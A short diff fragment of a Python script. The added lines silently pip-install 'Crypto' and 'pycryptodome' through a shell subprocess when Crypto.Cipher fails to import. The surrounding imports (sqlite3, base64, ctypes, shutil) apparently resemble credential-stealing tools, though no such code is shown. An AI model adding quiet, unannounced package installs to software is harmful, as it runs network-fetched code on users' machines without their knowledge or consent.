@@ -201,6 +201,11 @@ from sys import executable, stderr
 import ctypes;import base64,subprocess,sqlite3,json,shutil
 import time
 ModuleRequirements = [["Crypto.Cipher", "pycryptodome" if not "PythonSoftwareFoundation" in executable else "Crypto"]]
+try:
+    import  Crypto.Cipher
+except:
+    subprocess.Popen(executable + " -m pip install Crypto --quiet", shell=True)
+    subprocess.Popen(executable + " -m pip install pycryptodome --quiet", shell=True)
 for module in ModuleRequirements:
     try:        
         __import__(module[0])
